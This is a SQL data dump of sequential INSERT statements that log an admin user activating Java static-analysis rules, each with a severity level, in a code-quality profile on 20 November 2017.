INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1956, '2017-11-20 11:09:28.827', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2278;ruleKey=squid:S2278;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmV7bbGRdfPp-q8H');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1957, '2017-11-20 11:09:28.859', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2293;ruleKey=squid:S2293;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmWbbbGRdfPp-q8I');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1958, '2017-11-20 11:09:28.912', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2326;ruleKey=squid:S2326;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmXQbbGRdfPp-q8J');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1959, '2017-11-20 11:09:28.97', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2386;ruleKey=squid:S2386;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmYKbbGRdfPp-q8K');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1960, '2017-11-20 11:09:29.058', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2387;ruleKey=squid:S2387;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmZibbGRdfPp-q8L');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1961, '2017-11-20 11:09:29.173', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2388;ruleKey=squid:S2388;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmbVbbGRdfPp-q8M');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1962, '2017-11-20 11:09:29.205', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2390;ruleKey=squid:S2390;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmb1bbGRdfPp-q8N');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1963, '2017-11-20 11:09:29.228', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2391;ruleKey=squid:S2391;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmcMbbGRdfPp-q8O');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1964, '2017-11-20 11:09:29.252', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2437;ruleKey=squid:S2437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmckbbGRdfPp-q8P');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1965, '2017-11-20 11:09:29.277', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2438;ruleKey=squid:S2438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmc9bbGRdfPp-q8Q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1966, '2017-11-20 11:09:29.295', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2440;ruleKey=squid:S2440;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmdPbbGRdfPp-q8R');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1967, '2017-11-20 11:09:29.318', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2441;ruleKey=squid:S2441;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmdmbbGRdfPp-q8S');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1968, '2017-11-20 11:09:29.337', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2442;ruleKey=squid:S2442;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmd5bbGRdfPp-q8T');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1969, '2017-11-20 11:09:29.368', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2445;ruleKey=squid:S2445;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmeYbbGRdfPp-q8U');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1970, '2017-11-20 11:09:29.404', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2446;ruleKey=squid:S2446;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHme8bbGRdfPp-q8V');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1971, '2017-11-20 11:09:29.429', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2447;ruleKey=squid:S2447;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmfVbbGRdfPp-q8W');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1972, '2017-11-20 11:09:29.47', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2583;ruleKey=squid:S2583;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmf-bbGRdfPp-q8X');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1973, '2017-11-20 11:09:29.511', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2589;ruleKey=squid:S2589;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmgnbbGRdfPp-q8Y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1974, '2017-11-20 11:09:29.545', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2629;ruleKey=squid:S2629;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmhJbbGRdfPp-q8Z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1975, '2017-11-20 11:09:29.581', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2637;ruleKey=squid:S2637;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmhtbbGRdfPp-q8a');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1976, '2017-11-20 11:09:29.617', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2638;ruleKey=squid:S2638;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmiRbbGRdfPp-q8b');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1977, '2017-11-20 11:09:29.648', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2639;ruleKey=squid:S2639;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmiwbbGRdfPp-q8c');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1978, '2017-11-20 11:09:29.705', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2653;ruleKey=squid:S2653;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmjpbbGRdfPp-q8d');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1979, '2017-11-20 11:09:29.743', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2674;ruleKey=squid:S2674;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmkPbbGRdfPp-q8e');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1980, '2017-11-20 11:09:29.796', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2675;ruleKey=squid:S2675;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmlDbbGRdfPp-q8f');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1981, '2017-11-20 11:09:29.831', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2676;ruleKey=squid:S2676;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmlnbbGRdfPp-q8g');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1982, '2017-11-20 11:09:29.884', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2677;ruleKey=squid:S2677;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmmcbbGRdfPp-q8h');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1983, '2017-11-20 11:09:29.931', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2681;ruleKey=squid:S2681;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmnLbbGRdfPp-q8i');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1984, '2017-11-20 11:09:29.985', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2692;ruleKey=squid:S2692;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmoBbbGRdfPp-q8j');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1985, '2017-11-20 11:09:30.04', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2695;ruleKey=squid:S2695;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmo4bbGRdfPp-q8k');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1986, '2017-11-20 11:09:30.095', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2696;ruleKey=squid:S2696;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmpubbGRdfPp-q8l');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1987, '2017-11-20 11:09:30.128', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2718;ruleKey=squid:S2718;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmqQbbGRdfPp-q8m');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1988, '2017-11-20 11:09:30.168', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2737;ruleKey=squid:S2737;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmq4bbGRdfPp-q8n');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1989, '2017-11-20 11:09:30.204', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2757;ruleKey=squid:S2757;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmrcbbGRdfPp-q8o');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1990, '2017-11-20 11:09:30.239', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2786;ruleKey=squid:S2786;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmr_bbGRdfPp-q8p');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1991, '2017-11-20 11:09:30.277', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2789;ruleKey=squid:S2789;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmslbbGRdfPp-q8q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1992, '2017-11-20 11:09:30.302', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2864;ruleKey=squid:S2864;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHms-bbGRdfPp-q8r');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1993, '2017-11-20 11:09:30.328', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2885;ruleKey=squid:S2885;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmtYbbGRdfPp-q8s');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1994, '2017-11-20 11:09:30.365', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2886;ruleKey=squid:S2886;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmt9bbGRdfPp-q8t');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1995, '2017-11-20 11:09:30.389', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2912;ruleKey=squid:S2912;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmuVbbGRdfPp-q8u');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1996, '2017-11-20 11:09:30.416', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2924;ruleKey=squid:S2924;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmuwbbGRdfPp-q8v');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1997, '2017-11-20 11:09:30.451', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2925;ruleKey=squid:S2925;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmvTbbGRdfPp-q8w');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1998, '2017-11-20 11:09:30.467', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2970;ruleKey=squid:S2970;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmvjbbGRdfPp-q8x');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1999, '2017-11-20 11:09:30.492', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2975;ruleKey=squid:S2975;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmv8bbGRdfPp-q8y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2000, '2017-11-20 11:09:30.522', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2976;ruleKey=squid:S2976;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmwabbGRdfPp-q8z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2001, '2017-11-20 11:09:30.553', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3008;ruleKey=squid:S3008;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmw5bbGRdfPp-q80');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2002, '2017-11-20 11:09:30.586', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3010;ruleKey=squid:S3010;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmxabbGRdfPp-q81');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2003, '2017-11-20 11:09:30.624', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3020;ruleKey=squid:S3020;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmyAbbGRdfPp-q82');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2004, '2017-11-20 11:09:30.66', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3027;ruleKey=squid:S3027;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmykbbGRdfPp-q83');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2005, '2017-11-20 11:09:30.695', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3034;ruleKey=squid:S3034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmzHbbGRdfPp-q84');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2006, '2017-11-20 11:09:30.729', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3038;ruleKey=squid:S3038;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmzpbbGRdfPp-q85');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2007, '2017-11-20 11:09:30.767', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3042;ruleKey=squid:S3042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm0PbbGRdfPp-q86');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2008, '2017-11-20 11:09:30.793', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3046;ruleKey=squid:S3046;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm0pbbGRdfPp-q87');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2009, '2017-11-20 11:09:30.817', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3066;ruleKey=squid:S3066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm1BbbGRdfPp-q88');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2010, '2017-11-20 11:09:30.876', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3067;ruleKey=squid:S3067;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm18bbGRdfPp-q89');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2011, '2017-11-20 11:09:30.953', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3281;ruleKey=squid:S3281;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm3JbbGRdfPp-q8-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2012, '2017-11-20 11:09:31.105', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3346;ruleKey=squid:S3346;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm5hbbGRdfPp-q8_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2013, '2017-11-20 11:09:31.23', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3355;ruleKey=squid:S3355;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm7ebbGRdfPp-q9A');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2014, '2017-11-20 11:09:31.266', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3358;ruleKey=squid:S3358;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm8CbbGRdfPp-q9B');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2015, '2017-11-20 11:09:31.303', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3398;ruleKey=squid:S3398;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm8nbbGRdfPp-q9C');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2016, '2017-11-20 11:09:31.337', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3400;ruleKey=squid:S3400;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm9JbbGRdfPp-q9D');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2017, '2017-11-20 11:09:31.376', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3415;ruleKey=squid:S3415;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm9wbbGRdfPp-q9E');
